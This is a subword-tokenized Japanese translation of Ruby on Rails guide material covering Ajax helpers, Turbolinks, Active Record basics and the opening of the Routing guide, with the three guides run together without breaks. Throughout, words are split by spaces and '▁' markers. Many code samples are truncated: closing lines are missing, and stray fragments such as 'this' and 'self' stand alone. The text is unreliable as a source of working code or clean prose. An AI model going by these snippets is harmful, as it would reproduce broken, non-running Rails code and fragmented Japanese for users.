▁これにより 、 フォームの 送信 が ブラウザ による 通常の 送信 メ カ ニ ズ ム ではなく Ajax によって 送信 される ようになります 。
▁ 記 入 済み の ` < form > ` を 得られ た だけで は 何か 物 足 り ません 。
▁ フォーム 送信 が 成功 した 場合に 何らかの 表示 を行い たい ものです 。
▁これ を行なう には 、` ajax : success ` イベント を バ イン ド します 。
▁ 送信 に 失敗した場合 は ` ajax : error ` を使用します 。
▁ 実際に 見 てみましょう 。
▁$ ( document ). read y ▁->
▁$ (" # new _ article ") . on (" ajax : success ", ▁( e , ▁ data , ▁ status , ▁ x h r ) ▁->
▁$ (" # new _ article ") . app end ▁ x h r . response T ext
▁ ). on ▁" ajax : error ", ▁( e , ▁ x h r , ▁ status , ▁ error ) ▁->
▁$ (" # new _ article ") . app end ▁" < p > ER R O R </ p > "
▁ 明 ら か に 、 従来 の 書き 方 よりも 洗 練 されています 。 しかし これは ほ ん の さ わ り です 。
▁詳細については 、[ jquery - u js ▁ wiki ]( https :// github . com / rails / jquery - u js / wiki / ajax ) に 掲 載 されている イベント を参照してください 。
▁### ▁ form _ tag
▁[ ` form _ tag ` ]( http :// api . rubyonrails . org / classes / ActionView / Helper s / Form T a g Helper . html # method - i - form _ tag ) ▁ は ` form _ for ` と よく 似 ています 。
▁このメソッド には `: remote ` オプション があり 、 以下のように 使用できます 。
▁<%= ▁ form _ tag (' / articles ', ▁ remote : ▁true ) ▁do ▁%>
▁< form ▁ accept - cha r set =" UT F - 8 " ▁ action =" / articles " ▁ data - remote =" true " ▁ method =" post ">
▁その 他の 点 は ` form _ for ` と同じ です 。
▁詳細については ドキュメント を参照してください 。
▁### ▁ link _ to
▁[ ` link _ to ` ]( http :// api . rubyonrails . org / classes / ActionView / Helper s / U r l Helper . html # method - i - link _ to ) ▁ は リンク の 生成 を 支 援 する ヘルパー です 。
▁このメソッド には `: remote ` オプション があり 、 以下のように 使用できます 。
▁<%= ▁ link _ to ▁" an ▁ article ", ▁@ article , ▁ remote : ▁true ▁%>
▁上のコード によって 以下 が 生成されます 。
▁< a ▁ href =" / articles /1 " ▁ data - remote =" true "> an ▁ article </ a >
▁` form _ for ` の場合 と同様 、 同じ Ajax イベント を バ イン ド できます 。
▁1 クリック で 削除 できる 記事 の 一覧 が あるとします 。
▁この HTML は 以下のような感じ になります 。
▁<%= ▁ link _ to ▁" D e let e ▁ article ", ▁@ article , ▁ remote : ▁true , ▁ method : ▁: delete ▁%>
▁ 上 に 加 え 、 以下の 様 な CoffeeScript を作成します 。
▁$ (" a [ data - remote ] ") . on ▁" ajax : success ", ▁( e , ▁ data , ▁ status , ▁ x h r ) ▁->
▁ alert ▁" The ▁ article ▁ w as ▁ delete d . "
▁### ▁ button _ to
▁[ ` button _ to ` ]( http :// api . rubyonrails . org / classes / ActionView / Helper s / U r l Helper . html # method - i - button _ to ) は ボタン 作成 を 支 援 する ヘルパー です 。
▁このメソッド には `: remote ` オプション があり 、 以下のように 使用できます 。
▁<%= ▁ button _ to ▁" A n ▁ article ", ▁@ article , ▁ remote : ▁true ▁%>
▁上のコード によって 以下 が 生成されます 。
▁< form ▁ action =" / articles /1 " ▁class =" button _ to " ▁ data - remote =" true " ▁ method =" post ">
▁< div >< input ▁type =" submit " ▁ value =" A n ▁ article " ></ div >
▁ 作成される のは 通常の ` < form > ` なので 、` form _ for ` に関する 情報 はすべて ` button _ to ` にも 適 用 できます 。
▁ サーバー 側 で 考 慮 すべき 点
▁ Ajax は クライアント 側 だけで なく 、 ある程度 サーバー 側 で の サポート も 必要 です 。
▁ Ajax リクエスト に対して レスポンス を返す 際 の 形式 は 、 HTML よりも JSON を使用すること が 好 まれ る よう です 。
▁それでは 、 必要となる もの について解説します 。
▁### ▁ シンプルな 例
▁ 表示 したい ユーザー リスト があり 、 その ページに 新規ユーザー を作成する フォーム も 置 き たい とします 。
▁この コントローラの index アクション は以下のようになります 。
▁class ▁User sController ▁< ▁ Application Controller
▁def ▁ index
▁@ users ▁= ▁User . all
▁@ user ▁= ▁User . new
▁ index ビュー ▁( ` app / views / users / index . html . erb ` ) ▁ の内容 は以下のようになります 。
▁< b > Users </ b >
▁< ul ▁id =" users ">
▁<%= ▁render ▁@ users ▁%>
▁</ ul >
▁<%= ▁ form _ for (@ user , ▁ remote : ▁true ) ▁do ▁| f | ▁%>
▁<%= ▁f . label ▁: name ▁% >< br >
▁<%= ▁f . text _ field ▁: name ▁%>
▁<%= ▁f . submit ▁%>
▁` app / views / users / _ user . html . erb ` パーシャル の内容 は以下のようになります 。
▁< li > <%= ▁ user . name ▁%></ li >
▁ index ページの 上 部 には ユーザーの 一覧 が表示されます 。
▁ 下 部 には ユーザー 作成 用の フォーム が表示されます 。
▁ 下 部 の フォーム は ` Users Controller ` の ` create ` アクション を呼び出します 。
▁ フォームの remote オプション が オン になっている ので 、 リクエスト は Ajax リクエスト として ` Users Controller ` に渡され 、 JavaScript を探し ます 。
▁this
▁# ▁app / controllers / users _ controller . rb
▁# ▁ ... ...
▁def ▁create
▁@ user ▁= ▁User . new ( params [: user ] )
▁ respond _ to ▁do ▁| format |
▁if ▁@ user . save
▁ format . html ▁ { ▁ redirect _ to ▁@ user , ▁ no tic e : ▁' User ▁ w as ▁ success full y ▁ created . '
▁ format . js ▁ { }
▁ format . json ▁ { ▁render ▁ json : ▁@ user , ▁ status : ▁: created , ▁ location : ▁@ user ▁ }
▁ else
▁ format . html ▁ { ▁render ▁ action : ▁" new " ▁ }
▁ format . json ▁ { ▁render ▁ json : ▁@ user . errors , ▁ status : ▁: un process able _ ent ity ▁ }
▁end
▁ format . js が ` respond _ to ` ブロック の中に ある 点 にご注目ください 。 これ によって 、 ▁ コントローラ が Ajax リクエスト に 応答 できるようになります 。
▁続いて 、 対応する ` app / views / users / create . js . erb ` ビュー ファイル を作成します 。 実際の JavaScript はこの ビューで 生成 され 、 クライアント に 送信 されて そこで 実行されます 。
▁$ (" <%= ▁ es ca p e _ javascript ( render ▁@ user ) ▁%> ") . app end To (" # users ") ;
▁ Turbolinks
▁Rails ▁4 には [ Turbolinks ▁gem ]( https :// github . com / rails / turbolinks ) が 同 梱 されています 。
▁この gem では 、 ページの レンダリング を 多くの ページ で 高速 化 するのに Ajax を使用しています 。
▁### ▁ Turbolinks の動作 原 理
▁ Turbolinks は 、 ページ にある すべての ` < a > ` に クリック ハ ンド ラ を 1 つ ず つ 追加 します 。
▁続いて 、 Turbolinks は P u sh S t at e を使用して URL を 正しい もの に 書き 換 え 、 リ フ レ ッ シ ュ の セ マ ン テ ィ ク ス を 維 持 し ながら プ リ テ ィ URL を 与え ます 。
▁ Turbolinks を有効に するには 、 Turbolinks を Gemfile に追加 し 、 CoffeeScript の マニフェスト ▁( 通常 は ` app / assets / javascripts / application . js ` ) ▁ に ` / / = ▁require ▁ turbolinks ` を追加します 。
▁ Turbolinks を 特定の リンク で のみ 無効 に したい場合は 、 タグ に ` data - no - t u rb o link ` 属性 を追加します 。
▁< a ▁ href =" ... " ▁ data - no - t u rb o link > No ▁ turbolinks ▁ her e </ a > .
▁### ▁ ページ 変更 イベント
▁ CoffeeScript コードを 開発 中 、 ページ 読み込み に 関連する 処理 を追加した くなる ことが よく あります 。
▁ j Query を使用する のであれば 、 たとえば 以下のような コードを 書くこと がある でしょう 。
▁ alert ▁" page ▁has ▁ load ed ! "
▁しかし 、 通常の ページ 読み込み プロセス は Turbolinks によって 上 書き され てしまう ため 、 ページ 読み込み に 依 存 する イベント は トリガ されません 。
▁ このような コード がある場合 は 、 以下のように 書き 換 え なければなりません 。
▁$ ( document ). on ▁" page : change ", ▁->
▁この 他 に バ イン ド 可能な イベント など の詳細については 、[ Turbolinks ▁ README ]( https :// github . com / rails / turbolinks / b lo b / master / README . m d ) を参照してください 。
▁その 他の 情報 源
▁ 詳 細 の 学習 に 役 立 つ リンクを いくつか 紹 介 します 。
▁* ▁[ jquery - u js ▁ wiki ]( https :// github . com / rails / jquery - u js / wiki )
▁* ▁[ jquery - u js に関する 外部 記事 の リスト ]( https :// github . com / rails / jquery - u js / wiki / E x ter n al - articles )
▁* ▁[ Rails ▁3 ▁ Re m o te ▁ L in k s と Form s について : ▁ 決 定 版 ガイド ]( http :// www . al fa j an g o . com / blog / rails - 3 - remote - links - and - form s / )
▁* ▁[ Rails casts : ▁ 控 え め な JavaScript ]( http :// rails casts . com / e p is odes / 20 5 - un o b tr us ive - javascript )
▁* ▁[ Rails casts : ▁ Turbolinks ]( http :// rails casts . com / e p is odes / 3 9 0 - turbolinks ? lang u age = j a & view = as c i i ca st ) ▁( 日 本 語 )
▁Active ▁Record ▁ の基礎
▁= = ========= =========
▁この ガイド では Active ▁Record の基礎 について説明し ます 。
▁* ▁OR M ▁( オブジェクト リ レ ー シ ョ ナ ル マッピング ) ▁ と Active ▁Record について 、 および Rails で の 利用 方法
▁* ▁Active ▁Record と MVC ▁( Model - View - Controller ) パ ラ ダ イ ム の 親 和 性
▁* ▁Active ▁Record モデル を使用して リ レ ー シ ョ ナ ル データベースに保存 された データを 操作 する
▁* ▁Active ▁Record スキーマ における 名前 付け ルール
▁* ▁ データベースの マイグレーション 、 検証 ( validation ) 、 コールバック
▁Active ▁Record について
▁Active ▁Record とは 、[ MVC ]( http :// j a . w ikipedia . org / wiki / Model _ View _ Controller ) で言う ところ の M 、 つまり モデル に相当 する もの であり 、 ビ ジ ネ ス データ と ビ ジ ネ ス ロ ジ ッ ク を表す システム の 階層 です 。
▁Active ▁Record は 、 データベースに 恒 久 的に 保存 される 必要 のある ビ ジ ネ ス オブジェクトの 作成 と 利用 を 円滑 に 行 な え るように します 。
▁Active ▁Record は 、 O R M ▁( オブジェクト リ レ ー シ ョ ナ ル マッピング ) ▁ システム に 記述 されている 「 Active ▁Record パターン 」 を 実装 した もの であり 、 同じ 名前 が 付け られ ています 。
▁### ▁Active ▁Record パターン
▁[ Active ▁Record は M ar t in ▁F o w l er によって ]( http :// www . m ar t info w l er . com / e a a C at a log / active Re c or d . html ) ▁ _ P at ter n s ▁of ▁ E n ter p ri s e ▁ Application ▁A r ch it e ct ur e _ ▁という 書 籍 で 記述 されました 。
▁Active ▁Record において 、 オブジェクト とは 永続的 な データ であり 、 その データ に対する 振る舞い で もあります 。
▁### ▁ O / R マッピング
▁ オブジェクト リ レ ー シ ョ ナ ル マッピング ▁( O / R マッピング や O R M と 略 される こともあります ) とは 、 アプリケーション が 持つ リ ッ チ な オブジェクトを リ レ ー シ ョ ナ ル データベース ( R D B M S ) の テーブル に 接続 する ものです 。
▁OR M を使用することで 、 SQL 文 を直接 書く 代りに わずか な アクセス コードを 書く だけで 、 アプリケーション における オブジェクトの 属性 や リレーションシップ を データベースに保存 したり データベースから 読み出し たり すること が できるようになります 。
▁### ▁OR M フレームワーク として の Active ▁Record
▁Active ▁Record には さまざまな 機能 が 搭 載 され ており 、 その 中 でも 以下の もの が 特に 重要です 。
▁* ▁ モデル および モデル 内の データを 表現 する
▁* ▁ モデル 間 の 関連付け ( ア ソ シ エ ー ション ) を 表現 する
▁* ▁ 関連する モデル を 介 した 継 承 階層 を 表現 する
▁* ▁ データ が データベースに 永続的 に保存 される 前に 検証 ( validation ) を行なう
▁* ▁ オブジェクト 指 向 の 表 記 方法で データベース を 操作 する
▁Active ▁Record における Co C ( Co n ve n tion ▁ o ver ▁C on fig ur ation )
▁ 他の プログラミング 言語 や フレームワーク を使用して アプリケーション を作成する と 、 設定 のための コードを 大 量 に 書く 必要 が生じ が ち です 。
▁ 一般的な O R M アプリケーション では 特に この 傾 向 があります 。
▁しかし 、 Rails に 適 合 する ルール に従って い れば 、 Active ▁Record モデル を作成する ときに 、 設定 のために 書 か なければならない コードは 最 小 限 で 済み ます 。 場合によっては 設定 のための コードが 完全に 不 要 であること す ら あります 。
▁これは 、 アプリケーションの 設定 が ほとんど の場合 で 同じ なら ば 、 それ を デフォルト に すべき である という 考え に基づいて います 。
▁つまり 、 明 示 的な 設定 が 必要となる のは 標準 の ルール だけで は 不 足 がある場合 のみ ということです 。
▁### ▁ 命 名 ルール
▁Active ▁Record には 、 モデルと データベースの テーブル と の マッピング 作成 時 に従う べ き ルール が いくつか あります 。
▁Rails では 、 データベースの テーブル 名 を見つけ る ときに 、 モデルの クラス名 を 複数形 にしたもの を使用します 。
▁つまり 、` Book ` という モデル クラス がある場合 、 これ に対応する データベースの テーブル は 複数形 の ** books ** になります 。
▁Rails の 複数形 化 メ カ ニ ズ ム は 非常に 強 力 で 、 不 規 則 な 語 であっても 複数形 に したり 単数形 に したり できます ( person ▁< - > ▁ people など )。
▁ モデルの クラス名 が 2 語 以上 の 複 合 語 である 場合 、 Ruby の 慣習 である キ ャ メ ル ケース ( C am e l C as e のように 語 頭 を 大文字 に して スペース な し で つ な ぐ ) に従って ください 。 一方 、 テーブル 名 は ( ca me l _ case などの ように ) 小文字 かつ アンダースコア で 区切 られ なければなりません 。
▁以下の 例 を参照 ください 。
▁* ▁ データベースの テーブル ▁- ▁ 複数形 であり 、 語 は アンダースコア で 区切 られ る ▁( 例 : ▁` book _ c l ub s ` )
▁* ▁ モデルの クラス ▁- ▁ 単数形 であり 、 語 頭 を 大文字 にする ▁( 例 : ▁` Book C l ub ` )
▁| ▁ モデル ▁ / ▁ クラス ▁| ▁ テーブル ▁ / ▁ スキーマ ▁|
▁| ▁` L in e I te m ` ▁| ▁` line _ item s ` ▁|
▁| ▁` D e er ` ▁| ▁` de er s ` ▁|
▁| ▁` M o us e ` ▁| ▁` m i ce ` ▁|
▁| ▁` Person ` ▁| ▁` people ` ▁|
▁### ▁ スキーマ の ルール
▁Active ▁Record では 、 データベースの テーブル で 使用される カラム の名前 についても 、 利用 目的 に応じて ルール があります 。
▁* ▁** 外部キー ** ▁- ▁この カラム は ▁` テーブル 名 の 単数形 _ id ` ▁ に する必要があります ▁( 例 ▁` item _ id `、` order _ id ` )
▁これらの カラム は 、 Active ▁Record が モデル 間 の 関連付け を作成する ときに 参 照 されます 。
▁* ▁** 主キー ** ▁- ▁ デフォルトで は ▁` id ` ▁という 名前 を持つ integer の カラム を テーブル の 主キー として 使用します 。
▁この カラム は 、[ Active ▁Record マイグレーション ]( migration s . html ) を使用して テーブル を作成する ときに 自動的に 作成されます 。
▁ 他にも 、 Active ▁Record インスタンス に 機能 を追加する カラム 名 が いくつか あります 。
▁* ▁` created _ at ` ▁- ▁ レコード が 作成された 時に 現在の 日付 時刻 が自動的に 設定 されます
▁* ▁` updated _ at ` ▁- ▁ レコード が 更新 された ときに 現在の 日付 時刻 が自動的に 設定 されます
▁* ▁` lock _ version ` ▁- ▁ モデルに [ o p t im is tic ▁ lock ing ]( http :// api . rubyonrails . org / classes / ActiveRecord / L ock ing . html ) を追加します
▁* ▁` 関連付け 名 _ type ` ▁- ▁[ ポリモーフィック 関連付け ]( association _ basic s . html # ポリモーフィック 関連付け ) の 種類 を保存し ます
▁* ▁` テーブル 名 _ count ` ▁- ▁ 関連付け において 、 所 属 している オブジェクトの 数 を キャッシュ するのに 使用されます 。
▁NOT E : ▁これらの カラム 名 は 必 須 ではありません が 、 Active ▁Record に 予 約 されています 。
▁ 特殊な ことを する ので なければ 、 これらの 予 約 済み カラム 名 の 使用 は 避 け てください 。
▁たとえば 、` type ` という 語 は テーブル で S ing le ▁ T able ▁ In her it an ce ▁( S T I ) を指定する ために 予 約 されています 。
▁S T I を使用し ない として も 、 予 約 語 より 先に まず " con text " など のような 、 モデルの データを 適切に 表 す 語 を 検 討 してください 。
▁Active ▁Record の モデル を作成する
▁Active ▁Record モデルの 作成 は 非常に 簡単 です 。
▁ 以下のように ` ActiveRecord :: Base ` クラスの サブ クラス を作成する だけで 完了 します 。
▁class ▁ Product ▁< ▁ActiveRecord :: Base
▁上のコードは 、` Product ` モデル を作成し 、 データベースの ` products ` テーブル に マッピング されます 。
▁さらに 、 テーブル に 含 まれ ている 各 行 の カラム を 、 作成した モデルの インスタンス の 属性 に マッピング します 。
▁以下の SQL 文 で ` products ` テーブル を 作成した とします 。
▁C RE A T E ▁ T A B L E ▁ products ▁(
▁id ▁in t ( 11 ) ▁NOT ▁ NULL ▁ auto _ in c re m ent ,
▁name ▁ v ar cha r ( 2 5 5 ) ,
▁P R I M A R Y ▁ K E Y ▁( id )
▁上の テーブル スキーマ に従って 、 以下のような コードを い き なり 書く ことができます 。
▁ p ▁= ▁ Product . new
▁ p . name ▁= ▁" S o me ▁ Book "
▁ put s ▁ p . name ▁# ▁" S o me ▁ Book "
▁ 命 名 ルール を 上 書き する
▁Rails アプリケーションで 別の 命 名 ルール を使用し なければならない 、 レ ガ シ データベース を使用して Rails アプリケーション を作成し ない と い け ない などの 場合には どう すれば よいでしょう か 。
▁ そ ん な ときに は デフォルトの 命 名 ルール を簡単に オーバーライド できます 。
▁` ActiveRecord :: Base . table _ name = ` メソッドを使用して 、 使用 すべき テーブル 名 を明示的に指定 できます 。
▁self
▁` ActiveRecord :: Base . primary _ key = ` メソッドを使用して 、 テーブル の 主キー として 使用される カラム 名 も オーバーライド できます 。
▁self . primary _ key ▁= ▁" product _ id "
▁C R U D : ▁ データ の 読み 書き
▁ --------------- ---------------
▁C R U D とは 、 4 つの データベース 操作 を表す ▁** C ** ▁ re at e 、 ▁** R ** ▁ e ad 、 ▁** U ** ▁ p date 、 ▁** D ** ▁ e let e の 頭 字 語 です 。
▁Active ▁Record は これらの メソッドを 自動的に 作成 し 、 これ によって アプリケーション は テーブル に保存 されている データを 操作 することができます 。
▁### ▁ Create
▁Active ▁Record の オブジェクトは ハッシュ や ブロック から 作成 することができます 。 また 、 作成 後に 属性を 手動で 追加 できます 。
▁` new ` メソッド を実行すると 単 に 新しい オブジェクト が返されます が 、` create ` を実行すると 新しい オブジェクトが 返 され 、 さらに データベースに保存 されます 。
▁たとえば 、` User ` という モデルに ` name ` と ` o c c up ation ` という 属性 がある と すると 、` create ` メソッド を実行すると 新しい レコード が 1 つ 作成 され 、 データベースに保存 されます 。
▁ user ▁= ▁User . create ( name : ▁" David ", ▁ o c c up ation : ▁" Co de ▁A r t ist ")
▁` new ` メソッド を使用した 場合は 、 オブジェクトは 保存 され ずに インスタンス 化 されます 。
▁ user ▁= ▁User . new
▁ user . name ▁= ▁" David "
▁ user . o c c up ation ▁= ▁" Co de ▁A r t ist "
▁ この場合 、` user . save ` を実行して 初めて データベースに レコード が コミット されます 。
▁最後に 、` create ` や ` new ` に ブロック が 渡 される と 、 新しい オブジェクトは 初期化 のために ブロック に渡され ます 。
▁ user ▁= ▁User . new ▁do ▁| u |
▁ u . name ▁= ▁" David "
▁ u . o c c up ation ▁= ▁" Co de ▁A r t ist "
▁### ▁ Re ad
▁Active ▁Record は 、 データベース 内の データ にアクセス するための リ ッ チ な API を提供します 。
▁ 以下 は 、 Active ▁Record によって 提供され る さまざまな データ アクセス メソッドの ほ ん の 一 例 です 。
▁# ▁ すべての ユーザーの コレクション を返す
▁ users ▁= ▁User . all
▁# ▁ 最初の ユーザー を返す
▁ user ▁= ▁User . first
▁# ▁ David という 名前 を持つ 最初の ユーザー を返す
▁d a v id ▁= ▁User . find _ by ( name : ▁' David ')
▁# ▁ 名前 が David で 、 職 業 が コード ア ー テ ィ スト のユーザー をすべて 返 し 、 created _ at カラム で 逆 順 ソ ート する
▁Active ▁Record モデル への クエリ については [ Active ▁Record クエリ インターフェイス ]( active _ record _ query ing . html ) ガイド で 詳 細 を 説明します 。
▁### ▁ U p date
▁Active ▁Record オブジェクトを ひ と た び 取得 すると 、 オブジェクトの 属性 を変更 して データベースに保存 できるようになります 。
▁ user ▁= ▁User . find _ by ( name : ▁' David ')
▁ user . name ▁= ▁' D a ve '
▁ user . save
▁上のコード を もっと 短 く する のであれば 、 属性 名 と 、 設定 したい 値を マッピング する ハッシュ を使用して 次のように 書き ます 。
▁ user . update ( name : ▁' D a ve ')
▁これは 多くの 属性を 一度 に 更新 したい場合 に 特に 便利です 。
▁さらに 、 複数の レコード を 一度 に 更新 したい のであれば 、` update _ all ` という クラス メソッドが 便利です 。
▁User . update _ all ▁" ma x _ login _ at te m p t s ▁= ▁ 3, ▁ m us t _ change _ password ▁= ▁' true ' "
▁### ▁D e let e
▁ 他の メソッド と同様 、 Active ▁Record オブジェクトを ひ と た び 取得 すれば 、 そのオブジェクト を destroy することで データベースから 削除 できます 。
▁ user . destroy
▁ 検証 ( validation )
▁ -----------
▁Active ▁Record を使用して 、 モデル が データベースに 書き 込 まれ る 前に モデルの 状態 を検証する ことができます 。
▁ モデル をチェックする ための さまざまな メソッドが 用意されてい ます 。 属性 が 空 で ないこと 、 一意 であること 、 既に データベースに ないこと 、 特定の フォーマット に従って い ること など 、 多 岐 に わ た った 検証 が 行 え ます 。
▁以下の 例 で 簡単に 説明します 。
▁validates ▁: name , ▁ presence : ▁true
▁# ▁=> ▁false
▁# ▁=> ▁ActiveRecord :: Re c or d In valid : ▁ V al id ation ▁ failed : ▁ Name ▁c an ' t ▁be ▁ blank
▁ 検証 の詳細については [ Active ▁Record 検証 ガイド ]( active _ record _ validations . html ) を参照してください 。
▁Active ▁Record コールバック を使用することで 、 モデルの ラ イ フ サ イ ク ル における 特定の イベント 実行 時に コードを ア タ ッ チ して 実行 することができます 。
▁これにより 、 モデル で 特定の イベント が 発生 したときに コードが 透 過 的に 実行される ようになります 。 レコード の作成 、 更新 、 削除 など さまざまな イベント に対して コールバック を 設定 できます 。
▁ コールバック の詳細については [ Active ▁Record コールバック ガイド ]( active _ record _ c all b ack s . html ) を参照してください 。
▁ マイグレーション
▁Rails には データベース スキーマ を 管理 するための ドメイン 固 有 言語 ( D S L : ▁D o main ▁S p ec if i c ▁ L an g u age ) があり 、 マイグレーション ( migration ) と 呼ばれ ています 。
▁ マイグレーション は ファイルに 保存されます 。 ` rake ` を実行すると 、 Active ▁Record が サポート する あらゆる データベース に対して マイグレーション が 実行されます 。
▁ 以下 は テーブル を作成する マイグレーション です 。
▁class ▁ Create P ub li cat ions ▁< ▁ActiveRecord :: Migration
▁def ▁ change
▁create _ table ▁: public ation s ▁do ▁| t |
▁t . string ▁: title
▁t . text ▁: de script ion
▁t . ref er en ce s ▁: public ation _ type
▁t . integer ▁: publish er _ id
▁t . string ▁: publish er _ type
▁t . boolean ▁: s ing le _ issue
▁t . timestamp s
▁ add _ index ▁: public ation s , ▁: public ation _ type _ id
▁Rails は どの マイグレーション ファイルが データベースに コミット された か を 把 握 し ており 、 その 情報 を使用して ロー ル バ ッ ク 機能を 提供し ています 。
▁ テーブル を 実際に 作成する には ` rake ▁ db : migrate ` を実行します 。 ロー ル バ ッ ク するには ` rake ▁ db : r o ll b ack ` を実行します 。
▁上の マイグレーション コードは データベースに 依 存 していない ことにご注目ください 。 MySQL 、 PostgreSQL 、 O r a c le など 多くの データベース に対して 実行 できます 。
▁ マイグレーション の詳細については [ Active ▁Record マイグレーション ガイド ]( migration s . html ) を参照してください 。
▁Rails ▁ の ルーティング
▁= ================ ================
▁この ガイド では 、 開発者 に 向け て Rails の ルーティング 機能を 解説します ▁( 訳 注 : ▁ route と root を 区別 する ため 、 訳 文 では route を 基本的に 「 ルーティング 」 と 訳 します )。
▁* ▁` routes . rb ` のコード の 読み 方
▁* ▁ 独自の ルーティング 作成 法 ▁( リソース ベース の ルーティング が 推 奨 されます が 、` match ` メソッド による ルーティング も 可能です )
▁* ▁ アクション 側 で 受け 取 る パラメータ
▁* ▁ ルーティング ヘルパー を使用して パス や URL を 自動生成 する方法
▁* ▁ 制限 追加 や Rack エ ンド ポ イン ト などの 高度な 手法
▁Rails ルーター の 目的
▁ --------------- ----------------
▁Rails の ルーター は 受け 取 った URL を 認 識 し 、 適切な コントローラ 内 アクションに 割り当て ます 。
▁ ルーター は 、 ビューで これらの パス や URL を直接 ハ ー ド コード すること を避ける ために パス や URL を生成する こともできます 。
▁### ▁ URL を 実際の コード に 割 り 振 る
▁Rails アプリケーション が 以下の HTTP リクエストを 受け 取 った とします 。
▁GET ▁ / patient s / 17
▁この リクエスト は 、 特定の コントローラ 内 アクションに マッチ させる よう ルーター に 要求 しています 。
▁最初に マッチ した の が 以下の ルーティング だと します 。
▁get ▁' / patient s / : id ', ▁to : ▁' patient s # show '
▁この リクエスト は ` patient s ` コントローラの ` show ` アクションに 割り当て られ 、` params ` には ` { ▁id : ▁' 17 ' ▁ } ` ハッシュ が 含まれています 。
▁### ▁ コード から パス や URL を生成する
▁ パス や URL を生成する こともできます 。
▁たとえば 、 上の ルーティング が 以下のように 変更 された とします 。
▁get ▁' / patient s / : id ', ▁to : ▁' patient s # show ', ▁as : ▁' patient '
▁ そして 、 アプリケーションの コントローラに 以下のコード が あるとします 。
▁@ patient ▁= ▁P at i ent . find ( 17 )
▁ 上 記 に対応する ビュー は 以下 です 。
▁<%= ▁ link _ to ▁' P at i ent ▁Record ', ▁ patient _ path (@ patient ) ▁%>
▁これで 、 ルーター によって ` / patient s / 17 ` という パス が 生成されます 。
▁ これを 利用 することで ビュー が 改 修 し や す く なり 、 コード も 読み や す く なります 。
▁この ルーティング ヘルパー では id を指定する 必要 がない 点 にご注目ください 。
▁ リソース ベース の ルーティング : ▁Rails の デフォルト
▁--------- --------------- -----------
▁ リソース ベース の ルーティング ▁( 以下 リソース ルーティング ) ▁ を使用することで 、 リソース ベース で 構成 された コントローラ に対応する 共通 の ルーティング を 手 軽 に 宣言 できます 。
▁ リソース フル な ルーティング を 宣言 することで 、 コントローラの ` index `、` show `、` new `、` edit `、` create `、` update `、` destroy ` アクション を 個 別 に 宣言 し なくても 1 行 で 宣言 が完了し ます 。
▁### ▁Web 上の リソース
▁ ブラウザ は Rails に対して リクエストを 送信 する 際に 、 特定の HTTP メソッド ▁( ` GET `、` POST `、` PATCH `、` PUT `、` DELETE ` など ) ▁ を使用して 、 URL に対する リクエスト を作成します 。
▁ 上 に 述 べ た HTTP メソッドは 、 いずれ も リソース に対して 特定の 操作 の 実行 を 指示 する リクエスト です 。
▁ リソース ルーティング では 、 関連する さまざまな リクエストを 1 つの コントローラ 内の アクションに 割り当て ます 。
▁ DELETE ▁ / photos / 17
▁ resources ▁: photos
▁Rails はこの リクエストを ` photos ` コントローラ 内の ` destroy ` アクションに 割り当て 、` params ` ハッシュ に ` { ▁id : ▁' 17 ' ▁ } ` を含め ます 。
▁### ▁C R U D 、 動詞 、 アクション
▁Rails の リソース フル ルーティング では 、 ( GET 、 PUT などの ) ▁ 各 種 HTTP 動詞 ▁( v erb ) ▁ と 、 コントローラ 内 アクション を指す URL が 対応 付け られます 。
▁1 つの アクション は 、 データベース 上で の 特定の C R U D ▁( Create / Re ad / U p date / D e let e ) ▁ 操作 に 対応 付け られ る ルール になっています 。
▁たとえば 、 以下のような ルーティング が 1 つ あるとします 。
▁上の 記述 により 、 アプリケーション 内に 以下の 7 つの ルーティング が作成され 、 いずれ も ` P h o to s ` コントローラに 対応 付け られます 。
▁| ▁ HTTP 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 目的 ▁|
▁| ▁--------- ▁| ▁ ---------------- ▁| ▁- ---------------- ▁| ▁- ----------- ---------------- ---------------- ▁|
▁| ▁GET ▁| ▁ / photos ▁| ▁ photos # index ▁| ▁ すべての 写 真 の 一覧 を 表示 ▁|
▁| ▁GET ▁| ▁ / photos / new ▁| ▁ photos # new ▁| ▁ 写 真 を 1 つ 作成 するための HTML フォーム を返す ▁|
▁| ▁ POST ▁| ▁ / photos ▁| ▁ photos # create ▁| ▁ 写 真 を 1 つ 作成する ▁|
▁| ▁GET ▁| ▁ / photos / : id ▁| ▁ photos # show ▁| ▁ 特定の 写 真 を表示する ▁|
▁| ▁GET ▁| ▁ / photos / : id / edit ▁| ▁ photos # edit ▁| ▁ 写 真 編集 用の HTML フォーム を 1 つ 返す ▁|
▁| ▁ PATCH / PUT ▁| ▁ / photos / : id ▁| ▁ photos # update ▁| ▁ 特定の 写 真 を更新する ▁|
▁| ▁ DELETE ▁| ▁ / photos / : id ▁| ▁ photos # destroy ▁| ▁ 特定の 写 真 を削除する ▁|
▁NOT E : ▁Rails の ルーター では 、 サーバー への リクエストを マッチ させる 際に HTTP 動詞 と URL を 使用している ため 、 4 種類 の URL ▁( GET / POST / PATCH / DELETE ) ▁ が 7 種類 の 異なる アクション ▁( index / new / create / show / edit / update / destroy ) ▁ に 割り当て られ ています 。
▁NOT E : ▁Rails の ルーティング は 、 ルーティング ファイルの 「 上 から の 記 載 順に 」 マッチ します 。 このため 、 たとえば ` resources ▁: photos ` という ルーティング が ` get ▁' photos / p o ll ' ` よりも 前 の 行 に あ れば 、` resources ` 行 の ` show ` アクション が ` get ` 行 の 記述 よりも 優 先 されます ので 、` get ` 行 の ルーティング は 有効 になり ません 。
▁これ を修正する には 、` get ` 行 を ` re s or ce s ` 行 ▁** よりも 上 ** ▁ の 行 に移動し てください 。 これにより 、` get ` 行 が マッチする ようになります 。
▁### ▁ パス と URL 用 ヘルパー
▁ リソース フル な ルーティング を作成する と 、 アプリケーションの コントローラ で 多くの ヘルパー が 利用 できるようになります 。
▁` resources ▁: photos ` という ルーティング を 例 に 取 って みましょう 。
▁* ▁` photos _ path ` は ` / photos ` を返します
▁* ▁` new _ photo _ path ` は ` / photos / new ` を返します
▁* ▁` edit _ photo _ path (: id ) ` は ` / photos / : id / edit ` を返します ▁( ` edit _ photo _ path ( 10 ) ` であれば ` / photos / 10 / edit ` が返されます )
▁* ▁` photo _ path (: id ) ` は ` / photos / : id ` を返します 。 ▁( ` photo _ path ( 10 ) ` であれば ` / photos / 10 ` が返されます )
